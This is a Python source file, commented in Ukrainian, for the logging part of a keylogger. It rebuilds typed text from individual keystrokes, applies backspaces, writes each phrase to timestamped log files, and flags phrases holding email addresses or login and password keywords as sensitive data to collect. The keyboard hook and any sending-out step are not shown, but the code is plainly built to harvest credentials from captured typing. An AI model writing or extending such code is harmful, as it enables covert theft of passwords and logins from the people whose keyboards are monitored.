import os
import json
import time
from datetime import datetime
import re

class Logger:
    def __init__(self):
        self.log_dir = "logs"  # Папка для логів
        self.log_file = self.create_log_file()
        self.phrase_buffer = []  # Буфер для зберігання натискань клавіш
        self.sensitive_data = []  # Список для зберігання чутливих даних

    def create_log_file(self):
        """Створює файл логу в папці logs з поточною датою і часом."""
        if not os.path.exists(self.log_dir):
            os.makedirs(self.log_dir)
        current_time = time.strftime("%Y-%m-%d_%H-%M-%S")
        return os.path.join(self.log_dir, f"log_{current_time}.txt")

    def log_event(self, event_type, details, level="INFO"):
        """Логування події з зазначенням рівня."""
        entry = {
            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
            "level": level,
            "event_type": event_type,
            "details": details
        }
        self.write_log(entry)

    def write_log(self, entry):
        """Записує лог у файл."""
        with open(self.log_file, 'a', encoding='utf-8') as log:
            log.write(json.dumps(entry, ensure_ascii=False) + "\n")

    def assemble_phrase(self, key):
        """Збирає фрази з натискань клавіш."""
        # Обробка видалення (backspace)
        if key == "Key.backspace":
            if self.phrase_buffer:
                self.phrase_buffer.pop()
            return

        # Ігноруємо спеціальні клавіші
        if key.startswith("Key."):
            if self.phrase_buffer:
                phrase = "".join(self.phrase_buffer)
                self.write_phrase(phrase)
                self.detect_sensitive_data(phrase)
                self.phrase_buffer.clear()
            return

        # Додаємо символ до буфера фраз
        self.phrase_buffer.append(key)

    def write_phrase(self, phrase):
        """Записує зібрану фразу в лог."""
        log_entry = {
            "timestamp": datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            "event_type": "phrase",
            "details": {"phrase": phrase}
        }
        self.write_log(log_entry)

    def detect_sensitive_data(self, phrase):
        """Перевіряє фразу на наявність чутливих даних, таких як логіни чи паролі."""
        email_pattern = r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'
        # Перевіряємо на поштову адресу
        if re.search(email_pattern, phrase):
            self.sensitive_data.append({"type": "email", "value": phrase})

        # Перевіряємо на ключові слова для логінів або паролів
        keywords = ["password", "login", "pass", "user", "пароль", "логін", "користувач"]
        for keyword in keywords:
            if keyword in phrase.lower():
                self.sensitive_data.append({"type": "login_or_password", "value": phrase})

    def get_sensitive_data(self):
        """Повертає чутливі дані, зібрані під час роботи."""
        return self.sensitive_data
